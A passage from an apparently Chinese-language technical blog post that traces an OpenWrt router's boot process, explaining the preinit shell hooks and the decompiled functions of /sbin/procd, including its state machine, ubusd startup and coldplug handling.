class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add failsafe failsafe_netlogin</span><br><span class="line">boot_hook_add failsafe failsafe_shell</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">run_init() &#123;</span><br><span class="line">preinit_ip_deconfig</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main run_init</span><br></pre></td></tr></table></figure><p>执行preinit_essential，而preinit_essential中啥也没有，因此什么都不执行？？</p><p>之后执行preinit_main，preinit_main中有<strong>define_default_set_state</strong>，<strong>do_ipq806x</strong>，<strong>preinit_ip</strong>，<strong>pi_indicate_preinit</strong>，<strong>failsafe_wait</strong>，<strong>run_failsafe_hook</strong>，<strong>indicate_regular_preinit</strong>，<strong>initramfs_test</strong>，<strong>do_mount_root</strong>，<strong>run_init</strong>函数，分别执行如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">define_default_set_state</span>() &#123;</span><br><span class="line">. /etc/diag.sh</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行&#x2F;etc&#x2F;diag.sh，<code>set_state() &#123; :; &#125;</code>default set</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_ipq806x() &#123;</span><br><span class="line">. /lib/ipq806x.sh</span><br><span class="line"></span><br><span class="line">ipq806x_board_detect</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行ipq806x.sh脚本中的**<code>ipq806x_board_detect</code>**函数，作用：读取板子的信息并记录</p><p><strong><code>preinit_ip</code></strong> 函数</p><ul><li><strong>接口选择</strong>：<ul><li>如果 <code>pi_ifname</code> 未设置，则使用 <code>ifname</code>。</li></ul></li><li><strong>配置接口</strong>：<ul><li>检查接口是否存在于 <code>/proc/net/dev</code>。</li><li>使用 <code>ifconfig</code> 命令配置接口的 IP 地址、子网掩码和广播地址，并激活接口。</li></ul></li></ul><p>**<code>pi_indicate_preinit</code>**：输出并亮灯预示初始化的状态，想来启动路由器的时候的亮灯由此而来</p><p><strong><code>failsafe_wait</code></strong> 函数：检测系统上是否应该进入故障安全模式（在给定的超时时间内<strong>等待特定按键输入</strong>，以触发故障安全模式或设置调试级别）</p><p>**<code>run_failsafe_hook</code> **函数：检查系统是否进入故障安全模式，如果进入则执行failsafe，并创建一个锁lock -w &#x2F;tmp&#x2F;.failsafe</p><p>**<code>indicate_regular_preinit</code>**函数：输出”Continuing with Regular Preinit\n”，并再次亮灯</p><p>**<code>initramfs_test</code>**函数：检查系统是否在 initramfs 模式下运行，并执行相关操作</p><blockquote><p>Initramfs 模式是一种用于引导 Linux 系统的初始文件系统模式。它通常用于在内核启动时提供一个临时的根文件系统，以便加载必要的驱动程序和初始化脚本，直到真正的根文件系统可以挂载为止。（或许解加密脚本便是从这里开始的？？）</p></blockquote><p>**<code>do_mount_root</code> **函数：负责挂载根文件系统并进行相关初始化。</p><p>**<code>run_init</code>**函数：运行preinit_ip_deconfig，负责卸载特定网络接口的 IP 配置。（对于重置网络环境十分重要）</p><p>至此preinit便运行完成</p><p>之后便回到&#x2F;sbin&#x2F;init中执行uloop_run(v1);</p><h3 id="sub-9344"><a href="#sub-9344" class="headerlink" title="sub_9344"></a>sub_9344</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_9344</span><span class="params">(<span class="type">int</span> result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_DWORD *)(result + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或许是对下一个的赋值？？要求下一个函数必须在子进程运行完毕才可运行？（感觉有道理</p><h3 id="sub-9350"><a href="#sub-9350" class="headerlink" title="sub_9350"></a>sub_9350</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_9350</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// r4</span></span><br><span class="line">  FILE *v1; <span class="comment">// r0</span></span><br><span class="line">  FILE *v2; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">stat</span> v4; <span class="comment">// [sp+0h] [bp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">2</span>]; <span class="comment">// [sp+58h] [bp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+60h] [bp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>]; <span class="comment">// [sp+64h] [bp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/sbin/procd&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_9BC4</span>();</span><br><span class="line">  <span class="keyword">if</span> ( dword_12488 &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">kill</span>(dword_12488, <span class="number">9</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">stat</span>(<span class="string">&quot;/tmp/sysupgrade&quot;</span>, &amp;v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">unsetenv</span>(<span class="string">&quot;INITRAMFS&quot;</span>);</span><br><span class="line">  <span class="built_in">unsetenv</span>(<span class="string">&quot;PREINIT&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Exec to real procd now\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Exec to real procd now\n&quot;</span>, <span class="string">&quot;spawn_procd&quot;</span>, <span class="number">66</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;WDTFD&quot;</span>, v0, <span class="number">1</span>);</span><br><span class="line">  v1 = <span class="built_in">fopen</span>(<span class="string">&quot;/tmp/debug_level&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v2 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fscanf</span>(v1, <span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/tmp/debug_level&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v6 - <span class="number">1</span>) &lt;= <span class="number">3</span> )</span><br><span class="line">      dword_12474 = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_12474 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="number">2u</span>, <span class="string">&quot;%d&quot;</span>, dword_12474);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;DBGLVL&quot;</span>, s, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">execvp</span>(argv[<span class="number">0</span>], argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数用于清理环境、设置调试级别，并最终再次执行 <code>/sbin/procd</code></p><h2 id="sbin-procd-1"><a href="#sbin-procd-1" class="headerlink" title="&#x2F;sbin&#x2F;procd"></a>&#x2F;sbin&#x2F;procd</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">getenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    debug_level = <span class="built_in">atoi</span>(v5);</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">getopt</span>(argc, (<span class="type">char</span> *<span class="type">const</span> *)argv, <span class="string">&quot;d:s:h:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ......</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">uloop_init</span>();</span><br><span class="line">  v10 = <span class="built_in">sub_A798</span>(v9);</span><br><span class="line">  <span class="built_in">sub_F594</span>(v10);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">getpid</span>() == <span class="number">1</span> )</span><br><span class="line">    v11 = <span class="built_in">sub_AE4C</span>();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v11 = <span class="built_in">sub_BD60</span>();</span><br><span class="line">  <span class="built_in">uloop_run</span>(v11);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于没有参数，便直接break了</p><h3 id="sub-A798"><a href="#sub-A798" class="headerlink" title="sub_A798"></a>sub_A798</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_A798</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">signal</span>(<span class="number">13</span>, (<span class="type">__sighandler_t</span>)<span class="number">1</span>);</span><br><span class="line">  result = <span class="built_in">getpid</span>();</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">15</span>, &amp;act, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">10</span>, &amp;act, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">12</span>, &amp;act, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">11</span>, &amp;off_1AA20, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">7</span>, &amp;off_1AA20, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">1</span>, &amp;off_1AA34, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">9</span>, &amp;off_1AA34, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sigaction</span>(<span class="number">19</span>, &amp;off_1AA34, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置系统调用的处理方式，act是shutdown，1AA20是reboot，1AA34是无效调用</p><p>由于是execvp替换进程而pid是不会改变的，因此pid还是1，调用sub_AE4C函数</p><h3 id="sub-AE4C"><a href="#sub-AE4C" class="headerlink" title="sub_AE4C"></a>sub_AE4C</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_AE4C</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Change state %d -&gt; %d\n&quot;</span>, choi, choi + <span class="number">1</span>);</span><br><span class="line">    a1 = <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Change state %d -&gt; %d\n&quot;</span>, <span class="string">&quot;procd_state_next&quot;</span>, <span class="number">90</span>, choi, choi + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ++choi;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_AC7C</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sub-AC7C"><a href="#sub-AC7C" class="headerlink" title="sub_AC7C"></a>sub_AC7C</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_AC7C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">28</span>]; <span class="comment">// [sp+4h] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;/sbin/ubusd&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( choi )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- early -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - early -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_AACC</span>(<span class="number">0</span>);</span><br><span class="line">      v0 = <span class="built_in">sub_10C5C</span>(<span class="string">&quot;/etc/hotplug.json&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_FAF8</span>(v0);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">sub_AACC</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- ubus -\n&quot;</span>);</span><br><span class="line">      v1 = <span class="built_in">fputs</span>(<span class="string">&quot;procd: - ubus -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_BD60</span>(v1);</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- init -\n&quot;</span>);</span><br><span class="line">      v2 = <span class="built_in">fputs</span>(<span class="string">&quot;procd: - init -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_D628</span>(v2);</span><br><span class="line">      <span class="built_in">sub_D4CC</span>(<span class="string">&quot;ubus&quot;</span>, v3);</span><br><span class="line">      <span class="built_in">sub_B458</span>();</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;respawn&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;askconsole&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;askfirst&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;sysinit&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- init complete -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - init complete -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- shutdown -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - shutdown -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;shutdown&quot;</span>);</span><br><span class="line">      <span class="built_in">sync</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- reboot -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - reboot -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">reboot</span>(dword_1ACCC);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Unhandled state %d\n&quot;</span>, choi);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Unhandled state %d\n&quot;</span>, choi);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>状态处理</strong></p><ol><li><strong><code>case 1</code> - Early</strong>：<ul><li>记录日志 “- early -“</li><li>调用 <code>sub_AACC(0)</code> 执行早期初始化。</li><li>调用 <code>sub_10C5C(&quot;/etc/hotplug.json&quot;)</code> 处理配置文件。</li><li>调用 <code>sub_FAF8</code> 可能用于进一步初始化。</li></ul></li><li><strong><code>case 2</code> - Ubus Initialization</strong>：<ul><li>调用 <code>sub_AACC(0)</code>。</li><li>记录日志 “- ubus -“</li><li>调用 <code>sub_BD60</code> 进行 Ubus 初始化。</li><li>记录日志 “- init -“</li><li>调用 <code>sub_D628</code> 进行进一步初始化。</li><li>调用 <code>sub_D4CC(&quot;ubus&quot;, v3)</code> 启动 <code>/sbin/ubusd</code>。</li><li>调用 <code>sub_B458()</code> 执行其他初始化步骤。</li><li>调用 <code>sub_B3F4</code> 处理一系列状态（”respawn”, “askconsole”, “askfirst”, “sysinit”）。</li></ul></li><li><strong><code>case 3</code> - Init Complete</strong>：<ul><li>记录日志 “- init complete -“</li></ul></li><li><strong><code>case 4</code> - Shutdown</strong>：<ul><li>记录日志 “- shutdown -“</li><li>调用 <code>sub_B3F4(&quot;shutdown&quot;)</code> 处理关闭操作。</li><li>调用 <code>sync()</code> 确保数据完整性。</li></ul></li><li><strong><code>case 5</code> - Reboot</strong>：<ul><li>记录日志 “- reboot -“</li><li>调用 <code>reboot(dword_1ACCC)</code> 执行重启。</li></ul></li><li><strong><code>default</code> - Unhandled State</strong>：<ul><li>记录未处理状态的日志。</li></ul></li></ol><h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><p>sub_AACC函数确保在系统启动时正确初始化看门狗，以便在系统无响应时采取适当措施。</p><p>sub_10C5C函数用于设置和配置一个处理热插拔事件的套接字，并将其集成到事件循环中（或许第一次是初始化，这次才是配置？）</p><h4 id="sub-FAF8"><a href="#sub-FAF8" class="headerlink" title="sub_FAF8"></a>sub_FAF8</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">sub_FAF8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">void</span> *data; <span class="comment">// [sp+0h] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> *file[<span class="number">6</span>]; <span class="comment">// [sp+8h] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  file[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  file[<span class="number">0</span>] = <span class="string">&quot;udevtrigger&quot;</span>;</span><br><span class="line">  <span class="built_in">umount2</span>(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">umount2</span>(<span class="string">&quot;/dev/&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">mount</span>(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/dev&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0</span>, <span class="string">&quot;mode=0755,size=512K&quot;</span>);</span><br><span class="line">  <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/shm&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">  <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">  <span class="built_in">mount</span>(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  dword_1AE8C = (<span class="type">int</span>)sub_FA40;</span><br><span class="line">  v0 = fork();</span><br><span class="line">  dword_1AE90 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">execvp</span>(file[<span class="number">0</span>], file);</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start coldplug\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;procd: Failed to start coldplug\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start new coldplug instance\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;procd: Failed to start new coldplug instance\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">uloop_process_add</span>(&amp;unk_1AE80);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Launched coldplug instance, pid=%d\n&quot;</span>, dword_1AE90);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Launched coldplug instance, pid=%d\n&quot;</span>, <span class="string">&quot;procd_coldplug&quot;</span>, <span class="number">65</span>, dword_1AE90);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个函数的主要作用便是在系统启动时检测和初始化所有已连接的硬件设备，并add一个process sub_FA40</p><h3 id="sub-FA40"><a href="#sub-FA40" class="headerlink" title="sub_FA40"></a>sub_FA40</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_FA40</span><span class="params">()</span></span></span><br><span class="line"><span 